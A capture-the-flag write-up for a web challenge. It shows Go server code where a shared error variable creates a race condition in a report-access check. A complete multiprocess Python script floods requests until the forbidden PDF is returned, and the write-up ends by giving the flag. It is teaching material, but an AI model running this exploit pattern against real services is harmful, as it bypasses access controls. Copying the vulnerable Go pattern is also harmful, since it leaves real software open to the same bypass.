---
title: "██████████"
description: "RISC intro2web challenge 7"
pubDate: "Aug 27 2025"
heroImage: "/hero/index-bank-robber_Raaquilla.webp"
tags: ["cyber", "go", "python", "ctf", "exploit"]
---

###### [Canonical > RISC](https://writeups.urisc.club/web/7___________/)

## Challenge description

The ██████ with ███████ has ██████ and the ███ ███ ███████. Report ID 6 is not to be ████████.

---

## Approach

We can go to `/transparency/` and find that "Report ID 6" from the hint is referring to `Report 6 (PDF) (TO BE REVIEWED)` from the Transparency Report.

Looking at the `session.go` source code we find the vulnerability here:

```go
sockdir := "/tmp/session." + session
err := os.Mkdir(sockdir, 0o777)
if err != nil {
	panic(err)
}

http.HandleFunc("/getReport", func(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")
	if err = shouldAllowReport(id); err != nil {
		http.Error(w, "Invalid report!", http.StatusInternalServerError)
		return
	}

	file, err := os.Open("reports/" + id)
	if err != nil {
		http.Error(w, "Filesystem Error", http.StatusInternalServerError)
		return
	}

	data, err := io.ReadAll(io.LimitReader(file, 16777216))
	if err != nil {
		http.Error(w, "File Read Error", http.StatusInternalServerError)
		return
	}

	w.Write(data)
})
```

Specifically, `if err = shouldAllowReport(id)` doesnt use `:=` to declare and assign `err` like all the other calls, instead it uses ` =` which assigns the error to the previously declared `err` at `err := os.Mkdir(sockdir, 0o777)`.

This means that all threads of the `/getReport` http handler will use the same `err` variable, exposing a potential race condition where a request for `6.pdf` sets `err`, then a request to an allowed pdf sets it to `nil` making the `err != nil` check after `shouldAllowReport` pass for the `6.pdf` request.

We will attempt to hit the race condition by spamming requests to the server, some for 05.pdf which is allowed but returns a filesystem error to be faster than returning the pdf content, and some for 6.pdf to get our flag.

### Python implementation

```python
import requests
import os
from multiprocessing import Process, Queue

URL = "http://leftmanbrothers.ctf.urisc.club"


def worker(report_id, queue, cookie):
	sess = requests.Session()
	sess.cookies.set("sessionid", cookie)

	while True:
		r = sess.get(f"{URL}/transparency/getReport", params={"id": report_id})

		if r.status_code == 502:
			queue.put(None)
			return

		if report_id == "6.pdf" and r.status_code == 200:
			queue.put(r.content)
			return


def main():
	while True:
		queue = Queue()

		sess = requests.Session()
		r = sess.get(f"{URL}/transparency/")
		session_id = r.cookies.get("sessionid")

		print("Starting new session: ", session_id)

		processes = []
		for _ in range(14):
			p = Process(target=worker, args=("05.pdf", queue, session_id))
			processes.append(p)
			p.start()

		for _ in range(14):
			p = Process(target=worker, args=("6.pdf", queue, session_id))
			processes.append(p)
			p.start()

		flag = queue.get()

		for p in processes:
			p.terminate()
			p.join()

		queue.close()
		queue.join_thread()

		if flag is not None:
			with open("/tmp/6.pdf", "wb") as f:
				f.write(flag)

			print("Flag written to /tmp/6.pdf!")
			os.popen("open /tmp/6.pdf")
			break


if __name__ == "__main__":
	main()
```

After running for a few minutes, we get a success and find a sensitive note in 6.pdf:

> In recognition of the extraordinary discretion required, authentication for all internal<br>
> requests related to Project Backdoor will utilize the following passphrase:<br>
> RISC{leftman_liquidity_forever_9a7f42}<br>
> This string is not to be transmitted over open channels.

Our flag is:

```
RISC{leftman_liquidity_forever_9a7f42}
```
